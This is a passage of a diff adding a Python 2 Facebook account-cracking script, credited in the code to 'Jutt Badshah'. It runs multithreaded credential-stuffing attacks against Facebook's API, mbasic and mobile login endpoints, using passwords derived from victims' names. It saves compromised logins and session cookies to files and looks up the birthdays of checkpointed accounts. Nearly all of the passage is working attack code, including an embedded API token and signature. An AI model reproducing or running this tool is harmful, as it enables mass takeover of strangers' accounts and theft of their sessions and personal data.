+    try:
+        tzim = x['timezone']
+    except (KeyError, IOError):
+        tzim = '%s-%s' % (M, N)
+    except:
+        pass
+
+    print ' [*] time zone     : %s' % tzim
+    time.sleep(0.03)
+    try:
+        uptd = x['updated_time'][:10]
+        year, month, day = uptd.split('-')
+        month = bulan[month]
+    except (KeyError, IOError):
+        year = '%s-%s' % (M, N)
+        month = '%s-%s' % (M, N)
+        day = '%s-%s' % (M, N)
+    except:
+        pass
+
+    print ' [*] last updated at the date of of %s month %s year %s ' % (day, month, year)
+    time.sleep(0.03)
+    print ' %s[%s#%s]' % (N, O, N), 52 * '\x1b[1;96m-\x1b[0m'
+    jalan('\n [%s\xe2\x9c\x93%s] successfully checked data\xc2\xb2 Facebook account\n\n' % (O, N))
+    exit()
+
+
+def info_tools():
+    os.system('clear')
+    print ' %s[%s#%s]' % (N, O, N), 52 * '\x1b[1;96m-\x1b[0m'
+    time.sleep(0.07)
+    print '\n %s[%s>%s] YOutube       : Jutt Badshah 3.0' % (N, H, N)
+    time.sleep(0.07)
+    print '\n %s[%s>%s] Author   : Zafar Abbas' % (N, H, N)
+    time.sleep(0.07)
+    print '\n %s[%s>%s] Github   : https://github.com/juttbadshah6969' % (N, H, N)
+    time.sleep(0.07)
+    print '\n %s[%s#%s]' % (N, O, N), 52 * '\x1b[1;96m-\x1b[0m'
+    time.sleep(0.07)
+    raw_input('\n  [ %sBack%s ] ' % (O, N))
+    menu()
+
+
+def seting_useragent():
+    print '\n (%s1%s) change user agent' % (O, N)
+    print ' (%s2%s) check user agent' % (O, N)
+    ytbjts = raw_input('\n %s[%s?%s] choose : ' % (N, O, N))
+    if ytbjts == '':
+        print '\n %s[%s\xc3\x97%s] cannot be empty' % (N, M, N)
+        time.sleep(2)
+        seting_useragent()
+    elif ytbjts == '1':
+        yo_ndak_tau_ko_tanya_saia()
+    elif ytbjts == '2':
+        check_useragent()
+    else:
+        print '\n %s[%s\xc3\x97%s] correct input' % (N, M, N)
+        time.sleep(2)
+        seting_useragent()
+
+
+def yo_ndak_tau_ko_tanya_saia():
+    os.system('rm -rf useragent.txt')
+    print '\n %s(%s\xe2\x80\xa2%s) notice me: Search for User Agent on Google Chrome.' % (N, O, N)
+    print ' (%s\xc3\x97%s) type User Agent or My User Agent....\n' % (M, N)
+    anjng = raw_input(' [%s?%s] Enter User Agent :%s ' % (O, N, H))
+    if anjng == '':
+        print '\n %s[%s\xc3\x97%s] cannot be empty' % (N, M, N)
+        yo_ndak_tau_ko_tanya_saia()
+    try:
+        open('useragent.txt', 'w').write(anjng)
+        time.sleep(2)
+        jalan('\n %s[%s\xe2\x9c\x93%s] successfully changed user agent...' % (N, H, N))
+        raw_input('\n  %s[ %sBack%s ]' % (N, O, N))
+        menu()
+    except:
+        pass
+
+
+def check_useragent():
+    try:
+        user_agent = open('useragent.txt', 'r').read()
+    except IOError:
+        user_agent = '%s-' % M
+    except:
+        pass
+
+    print '\n %s[%s+%s] Your User Agent : %s%s' % (N, O, N, H, user_agent)
+    raw_input('\n  %s[ %sBack%s ]' % (N, O, N))
+    menu()
+
+
+class __crack__():
+
+    def __init__(self):
+        self.id = []
+
+    def plerr(self):
+        try:
+            self.apk = raw_input('\n [%s?%s] input file : ' % (O, N))
+            self.id = open(self.apk).read().splitlines()
+            print '\n [%s+%s] total id -> %s%s%s' % (O, N, M, len(self.id), N)
+        except:
+            print '\n %s[%s\xc3\x97%s] File [%s%s%s] nope, crack id first, you idiot!' % (N, M, N, M, self.apk, N)
+            time.sleep(3)
+            menu()
+
+        ___yayanganteng___ = raw_input(' [%s?%s] do you want to use manual password? [Y/N]: ' % (O, N))
+        if ___yayanganteng___ in ('Y', 'y'):
+            print '\n %s[%s!%s] use , (comma) for separator example: password123,password12345,etc. each word is at least 6 characters or more' % (N, M, N)
+            while True:
+                pwek = raw_input('\n [%s?%s] enter password : ' % (O, N))
+                print ' [*] crack with password -> [ %s%s%s ]' % (M, pwek, N)
+                if pwek == '':
+                    print '\n %s[%s\xc3\x97%s] dont empty the password bro' % (N, M, N)
+                elif len(pwek) <= 5:
+                    print '\n %s[%s\xc3\x97%s] password minimum 6 characters' % (N, M, N)
+                else:
+
+                    def __yan__(ysc=None):
+                        global cp
+                        global ok
+                        cin = raw_input('\n [*] method : ')
+                        if cin == '':
+                            print '\n %s[%s\xc3\x97%s] dont be empty bro' % (N, M, N)
+                            self.__yan__()
+                        elif cin == '1':
+                            print '\n [%s+%s] OK result saved to -> /sdcard/Jutt/OK.txt' % (O, N)
+                            print ' [%s+%s] CP result saved to -> /sdcard/Jutt/CP.txt' % (O, N)
+                            print '\n [%s!%s] you can turn off cellular data to pause the crack process\n' % (M, N)
+                            with YayanGanteng(max_workers=40) as (__Juttbadshah__):
+                                for ikeh in self.id:
+                                    try:
+                                        kimochi = ikeh.split('<=>')[0]
+                                        __Juttbadshah__.submit(self.__api__, kimochi, ysc)
+                                    except:
+                                        pass
+
+                            Results(ok, cp)
+                        elif cin == '2':
+                            print '\n [%s+%s] OK result saved to -> /sdcard/Jutt/OK.txt' % (O, N)
+                            print ' [%s+%s] CP result saved to -> /sdcard/Jutt/CP.txt' % (O, N)
+                            print '\n [%s!%s] you can turn off cellular data to pause the crack process\n' % (M, N)
+                            with YayanGanteng(max_workers=40) as (__Juttbadshah__):
+                                for ikeh in self.id:
+                                    try:
+                                        kimochi = ikeh.split('<=>')[0]
+                                        __Juttbadshah__.submit(self.__mbasic__, kimochi, ysc)
+                                    except:
+                                        pass
+
+                            Results(ok, cp)
+                        elif cin == '3':
+                            print '\n [%s+%s] OK result saved to -> /sdcard/Jutt/OK.txt' % (O, N)
+                            print ' [%s+%s] CP result saved to -> /sdcard/Jutt/CP.txt' % (O, N)
+                            print '\n [%s!%s] you can turn off cellular data to pause the crack process\n' % (M, N)
+                            with YayanGanteng(max_workers=40) as (__Juttbadshah__):
+                                for ikeh in self.id:
+                                    try:
+                                        kimochi = ikeh.split('<=>')[0]
+                                        __Juttbadshah__.submit(self.__mfb__, kimochi, ysc)
+                                    except:
+                                        pass
+
+                            Results(ok, cp)
+                        else:
+                            print '\n %s[%s\xc3\x97%s] correct input' % (N, M, N)
+                            self.__yan__()
+
+                    print '\n [ choose the login method - please try one ]\n'
+                    print ' [%s1%s]. method API (fast)' % (O, N)
+                    print ' [%s2%s]. method mbasic (slow)' % (O, N)
+                    print ' [%s3%s]. method mobile (super slow)' % (O, N)
+                    __yan__(pwek.split(','))
+                    break
+
+        elif ___yayanganteng___ in ('N', 'n'):
+            print '\n [ choose the login method - please try one ]\n'
+            print ' [%s1%s]. method API (fast)' % (O, N)
+            print ' [%s2%s]. method mbasic (slow)' % (O, N)
+            print ' [%s3%s]. method mobile (super slow)' % (O, N)
+            self.__pler__()
+        else:
+            print '\n %s[%s\xc3\x97%s] y/t stupid!' % (N, M, N)
+            time.sleep(2)
+            menu()
+        return
+
+    def __api__(self, user, __yan__):
+        global loop
+        (sys.stdout.write('\r [%s*%s] [Crack] %s/%s -> OK-:%s - CP-:%s ' % (O, N, loop, len(self.id), len(ok), len(cp))),)
+        sys.stdout.flush()
+        for pw in __yan__:
+            pw = pw.lower()
+            try:
+                os.mkdir('/sdcard/Jutt')
+            except:
+                pass
+
+            try:
+                _kontol = open('useragent.txt', 'r').read()
+            except (KeyError, IOError):
+                _kontol = requests.get('https://raw.githubusercontent.com/juttbadshah6969/cmbf/main/user-agent/user_agent.txt').text.strip()
+
+            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 
+               'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
+               'user-agent': _kontol, 
+               'content-type': 'application/x-www-form-urlencoded', 
+               'x-fb-http-engine': 'Liger'}
+            api = 'https://b-api.facebook.com/method/auth.login'
+            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
+            response = requests.get(api, params=params, headers=headers_)
+            if re.search('(EAAA)\\w+', response.text):
+                print '\r  %s* --> %s|%s                 %s' % (H, user, pw, N)
+                wrt = ' [\xe2\x9c\x93] %s|%s' % (user, pw)
+                ok.append(wrt)
+                open('/sdcard/Jutt/OK.txt', 'a').write('%s\n' % wrt)
+                break
+                continue
+            elif 'www.facebook.com' in response.json()['error_msg']:
+                try:
+                    kontol = open('login.txt').read()
+                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, kontol))
+                    az = json.loads(ak.text)
+                    graph = az['birthday']
+                    month, day, year = graph.split('/')
+                    month = bulan[month]
+                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K, user, pw, day, month, year, N)
+                    wrt = ' [\xc3\x97] %s|%s|%s %s %s' % (user, pw, day, month, year)
+                    cp.append(wrt)
+                    open('/sdcard/Jutt/CP.txt', 'a').write('%s\n' % wrt)
+                    break
+                except (KeyError, IOError):
+                    month = ''
+                    day = ''
+                    year = ''
+                except:
+                    pass
+
+                print '\r  %s* --> %s|%s                %s' % (K, user, pw, N)
+                wrt = ' [\xc3\x97] %s|%s' % (user, pw)
+                cp.append(wrt)
+                open('/sdcard/Jutt/CP.txt', 'a').write('%s\n' % wrt)
+                break
+                continue
+
+        loop += 1
+
+    def __mbasic__(self, user, __yan__):
+        global loop
+        (
+         sys.stdout.write('\r [%s*%s] [Crack] %s/%s -> OK-:%s - CP-:%s ' % (O, N, loop, len(self.id), len(ok), len(cp))),)
+        sys.stdout.flush()
+        for pw in __yan__:
+            pw = pw.lower()
+            try:
+                os.mkdir('/sdcard/Jutt')
+            except:
+                pass
+
+            try:
+                _kontol = open('useragent.txt', 'r').read()
+            except (KeyError, IOError):
+                _kontol = requests.get('https://raw.githubusercontent.com/juttbadshah6969/cmbf/main/user-agent/user_agent.txt').text.strip()
+
+            ses = requests.Session()
+            ses.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': _kontol, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
+            p = ses.get('https://mbasic.facebook.com')
+            b = ses.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'})
+            if 'c_user' in ses.cookies.get_dict().keys():
+                kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
+                print '\r  %s* --> %s|%s|%s                 %s' % (H, user, pw, kuki, N)
+                wrt = ' [\xe2\x9c\x93] %s|%s|%s' % (user, pw, kuki)
+                ok.append(wrt)
+                open('/sdcard/Jutt/OK.txt', 'a').write('%s\n' % wrt)
+                break
+                continue
+            elif 'checkpoint' in ses.cookies.get_dict().keys():
+                try:
+                    kontol = open('login.txt').read()
+                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, kontol))
+                    az = json.loads(ak.text)
+                    graph = az['birthday']
+                    month, day, year = graph.split('/')
+                    month = bulan[month]
+                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K, user, pw, day, month, year, N)
+                    wrt = ' [\xc3\x97] %s|%s|%s %s %s' % (user, pw, day, month, year)
+                    cp.append(wrt)
+                    open('/sdcard/Jutt/CP.txt', 'a').write('%s\n' % wrt)
+                    break
+                except (KeyError, IOError):
+                    month = ''
+                    day = ''
+                    year = ''
+                except:
+                    pass
+
+                print '\r  %s* --> %s|%s                %s' % (K, user, pw, N)
+                wrt = ' [\xc3\x97] %s|%s' % (user, pw)
+                cp.append(wrt)
+                open('/sdcard/Jutt/CP.txt', 'a').write('%s\n' % wrt)
+                break
+                continue
+
+        loop += 1
+
+    def __mfb__(self, user, __yan__):
+        global loop
+        Crack_Done()
+        (
+         sys.stdout.write('\r [%s*%s] [Crack] %s/%s -> OK-:%s - CP-:%s ' % (O, N, loop, len(self.id), len(ok), len(cp))),)
+        sys.stdout.flush()
+        for pw in __yan__:
+            pw = pw.lower()
+            try:
+                os.mkdir('/sdcard/Jutt')
+            except:
+                pass
+
+            try:
+                _kontol = open('useragent.txt', 'r').read()
+            except (KeyError, IOError):
+                _kontol = requests.get('https://raw.githubusercontent.com/juttbadshah6969/cmbf/main/user-agent/user_agent.txt').text.strip()
+
+            ses = requests.Session()
+            ses.headers.update({'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': _kontol, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
+            p = ses.get('https://m.facebook.com')
+            b = ses.post('https://m.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'})
+            if 'c_user' in ses.cookies.get_dict().keys():
+                kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
+                print '\r  %s* --> %s|%s|%s                 %s' % (H, user, pw, kuki, N)
+                wrt = ' [\xe2\x9c\x93] %s|%s|%s' % (user, pw, kuki)
+                ok.append(wrt)
+                open('/sdcard/Jutt/OK.txt', 'a').write('%s\n' % wrt)
+                break
+                continue
+            elif 'checkpoint' in ses.cookies.get_dict().keys():
+                try:
+                    kontol = open('login.txt').read()
+                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, kontol))
+                    az = json.loads(ak.text)
+                    graph = az['birthday']
+                    month, day, year = graph.split('/')
+                    month = bulan[month]
+                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K, user, pw, day, month, year, N)
+                    wrt = ' [\xc3\x97] %s|%s|%s %s %s' % (user, pw, day, month, year)
+                    cp.append(wrt)
+                    open('/sdcard/Jutt/CP.txt', 'a').write('%s\n' % wrt)
+                    break
+                except (KeyError, IOError):
+                    month = ''
+                    day = ''
+                    year = ''
+                except:
+                    pass
+
+                print '\r  %s* --> %s|%s                %s' % (K, user, pw, N)
+                wrt = ' [\xc3\x97] %s|%s' % (user, pw)
+                cp.append(wrt)
+                open('/sdcard/Jutt/CP.txt', 'a').write('%s\n' % wrt)
+                break
+                continue
+
+        loop += 1
+
+    def __pler__(self):
+        yan = raw_input('\n [*] method : ')
+        if yan == '':
+            print '\n %s[%s\xc3\x97%s] dont be empty bro' % (N, M, N)
+            self.__pler__()
+        elif yan in ('1', '01'):
+            print '\n [%s+%s] OK result saved to -> /sdcard/Jutt/OK.txt' % (O, N)
+            print ' [%s+%s] CP result saved to -> /sdcard/Jutt/CP.txt' % (O, N)
+            print '\n [%s!%s] you can turn off cellular data to pause the crack process\n' % (M, N)
+            with YayanGanteng(max_workers=40) as (__Juttbadshah__):
+                for yntks in self.id:
+                    try:
+                        bb = yntks.split('<=>')
+                        xz = bb[1].split(' ')
+                        if len(xz) == 1:
+                            raimuuu = [xz[0], xz[0] + '123', xz[0] + '12345',
+                             xz[0] + '12']
+                        elif len(xz) == 2:
+                            raimuuu = [xz[0] + '123', xz[0] + '12345',
+                             xz[1] + '123', xz[1] + '12345']
+                        elif len(xz) == 3:
+                            raimuuu = [xz[0] + '123', xz[0] + '12345',
+                             xz[1] + '123', xz[1] + '12345',
+                             xz[2] + '123', xz[2] + '12345']
+                        elif len(xz) == 4:
+                            raimuuu = [xz[0] + '123', xz[0] + '12345',
+                             xz[1] + '123', xz[1] + '12345',
+                             xz[2] + '123', xz[2] + '12345',
+                             xz[3] + '123', xz[3] + '12345']
+                        else:
+                            raimuuu = ['000786', '2345678']
+                        __Juttbadshah__.submit(self.__api__, bb[0], raimuuu)
+                    except:
+                        pass
+
+            Results(ok, cp)
+        elif yan in ('2', '02'):
+            print '\n [%s+%s] OK result saved to -> /sdcard/Jutt/OK.txt' % (O, N)
+            print ' [%s+%s] CP result saved to -> /sdcard/Jutt/CP.txt' % (O, N)
+            print '\n [%s!%s] you can turn off cellular data to pause the crack process\n' % (M, N)
+            with YayanGanteng(max_workers=40) as (__Juttbadshah__):
+                for yntks in self.id:
+                    try:
+                        bb = yntks.split('<=>')
+                        xz = bb[1].split(' ')
+                        if len(xz) == 1:
+                            raimuuu = [xz[0], xz[0] + '123', xz[0] + '12345',
+                             xz[0] + '12']
+                        elif len(xz) == 2:
+                            raimuuu = [xz[0] + '123', xz[0] + '12345',
+                             xz[1] + '123', xz[1] + '12345']
+                        elif len(xz) == 3:
+                            raimuuu = [xz[0] + '123', xz[0] + '12345',
+                             xz[1] + '123', xz[1] + '12345',
+                             xz[2] + '123', xz[2] + '12345']
+                        elif len(xz) == 4:
+                            raimuuu = [xz[0] + '123', xz[0] + '12345',
+                             xz[1] + '123', xz[1] + '12345',
+                             xz[2] + '123', xz[2] + '12345',
+                             xz[3] + '123', xz[3] + '12345']
+                        else:
+                            raimuuu = ['000786', '2345678']
+                        __Juttbadshah__.submit(self.__mbasic__, bb[0], raimuuu)
+                    except:
+                        pass
+
+            Results(ok, cp)
+        elif yan in ('3', '03'):
+            print '\n [%s+%s] OK result saved to -> /sdcard/Jutt/OK.txt' % (O, N)
+            print ' [%s+%s] CP result saved to -> /sdcard/Jutt/CP.txt' % (O, N)
+            print '\n [%s!%s] you can turn off cellular data to pause the crack process\n' % (M, N)
+            with YayanGanteng(max_workers=40) as (__Juttbadshah__):
+                for yntks in self.id:
+                    try:
+                        bb = yntks.split('<=>')
+                        xz = bb[1].split(' ')
+                        if len(xz) == 1:
+                            raimuuu = [xz[0], xz[0] + '123', xz[0] + '12345',
+                             xz[0] + '12']
+                        elif len(xz) == 2:
+                            raimuuu = [xz[0] + '123', xz[0] + '12345',
+                             xz[1] + '123', xz[1] + '12345']
+                        elif len(xz) == 3:
+                            raimuuu = [xz[0] + '123', xz[0] + '12345',
+                             xz[1] + '123', xz[1] + '12345',
+                             xz[2] + '123', xz[2] + '12345']
+                        elif len(xz) == 4:
+                            raimuuu = [xz[0] + '123', xz[0] + '12345',
+                             xz[1] + '123', xz[1] + '12345',
+                             xz[2] + '123', xz[2] + '12345',
+                             xz[3] + '123', xz[3] + '12345']
+                        else:
+                            raimuuu = ['000786', '2345678']
+                        __Juttbadshah__.submit(self.__mfb__, bb[0], raimuuu)
+                    except:
+                        pass
+
+            Results(ok, cp)
+        else:
+            print '\n %s[%s\xc3\x97%s] correct input' % (N, M, N)
+            self.__pler__()
+
+
+if __name__ == '__main__':
+    os.system('git pull')
+    menu()
